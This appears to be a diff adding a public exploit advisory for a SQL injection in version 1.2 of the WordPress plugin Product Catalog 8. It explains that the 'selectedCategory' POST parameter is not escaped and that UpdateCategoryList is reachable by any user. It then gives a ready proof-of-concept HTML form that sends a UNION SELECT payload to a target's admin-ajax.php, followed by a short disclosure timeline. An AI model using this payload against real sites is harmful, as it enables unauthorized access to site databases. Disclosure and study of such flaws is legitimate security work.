@@ -1,0 +1,35 @@
+# Exploit Title: Product Catalog 8 1.2 Plugin WordPress – Sql Injection
+# Date: 12/11/2016
+# Exploit Author: Lenon Leite
+# Vendor Homepage: https://wordpress.org/plugins/product-catalog-8/
+# Software Link: https://wordpress.org/plugins/product-catalog-8/
+# Contact: http://twitter.com/lenonleite
+# Website: http://lenonleite.com.br/
+# Category: webapps
+# Version: 1.2
+# Tested on: Windows 8.1
+
+1 - Description:
+
+$_POST[ ‘selectedCategory’ ] is not escaped.
+UpdateCategoryList() is accessible for any user.
+
+http://lenonleite.com.br/en/blog/2016/11/18/product-catalog-8-plugin-wordpress-sql-injection/
+
+2 - Proof of Concept:
+
+<form method="post" action="http://target/wp-admin/admin-ajax.php">
+<input type="text" name="selectedCategory" value="0 UNION SELECT 1,2,3,4,5,6 FROM wp_terms WHERE term_id=1">
+<input type="text" name="action" value="UpdateCategoryList">
+<input type="submit" value="Send">
+</form>
+
+3 - Timeline:
+
+12/11/2016 - Discovered
+12/11/2016 - vendor not found
+
+-- 
+Atenciosamente
+
+Lenon Leite
